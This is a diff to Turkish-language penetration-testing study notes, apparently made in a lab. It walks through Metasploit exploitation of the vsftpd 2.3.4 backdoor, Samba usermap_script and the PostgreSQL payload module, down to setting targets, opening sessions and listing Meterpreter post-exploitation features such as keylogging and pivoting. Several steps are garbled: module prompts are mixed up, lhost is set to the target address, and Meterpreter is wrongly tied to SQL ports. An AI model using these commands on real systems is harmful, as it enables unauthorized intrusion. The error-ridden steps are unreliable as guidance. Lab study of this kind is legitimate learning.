@@ -107,7 +107,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor)> ~sessions 1
 
 - Samba, Linux / Unix sistemlerin Windows ağlarıyla konuşmasını sağlayan bir servistir.Linux ↔ Windows dosya paylaşımı,Yazıcı paylaşımı, Ağ üzerinden klasör erişimi..
 
-- nmap sonucundaki Samba smbd 3.X - 4.X cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak
+- nmap sonucundaki "Samba smbd 3.X - 4.X" cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak
 
 ~msfconsole
 msf6> use exploit/multi/samba/usermap_scrip
@@ -119,3 +119,30 @@ msf6 exploit(multi/samba/usermap_scrip) > sessions -l
 msf6 exploit(multi/samba/usermap_scrip) > sessions 1
 uname -a //hacklediğin servis mi bak
 ls
+
+4. --Meterpreter--SQL Port 1433 / 3306 / 5432 gibi portlarda çalışır.
+
+- Bir sisteme erişim sağlandıktan sonra: Komut çalıştırma, Dosya işlemleri, Ekran görüntüsü, Keylogging (yetkili testte) ,Ağ pivoting, Yetki yükseltme (uygun senaryoda)
+- Meterpreter’in SQL servisi üzerinden tetiklenmiş olması muhtemel.Hep sql portuyla tetiklenmeyebilir
+
+- nmap sonuçlarında "PostgreSQL DB 8.3.0 - 8.3.7 cp ve exploitdb/rapid7 ten nasıl hackleneceğine bak
+
+~msfconsole
+~msf6> use exploit/linux/postgres/postgres_payload
+msf6 exploit(linux/postgres/postgres_payload) > show options
+msf6 exploit(multi/samba/usermap_scrip) > show options
+msf6 exploit(multi/samba/usermap_scrip) > set rhosts 10.0.2.5
+msf6 exploit(multi/samba/usermap_scrip) > set lhost 10.0.2.5 //localhost kendi ip
+msf6 exploit(multi/samba/usermap_scrip) > exploit -j -z
+msf6 exploit(multi/samba/usermap_scrip) > sessions -l
+msf6 exploit(multi/samba/usermap_scrip) > sessions 1
+
+meterpreter > //açılır
+meterpreter > help //yapabileceklerin çıkar
+
+**_Genel Güvenlik Nasıl Sağlanır_**
+
+- Exploit’i engelle
+- Zafiyeti kapat
+- Yetkiyi sınırla
+- Anomaliyi yakala
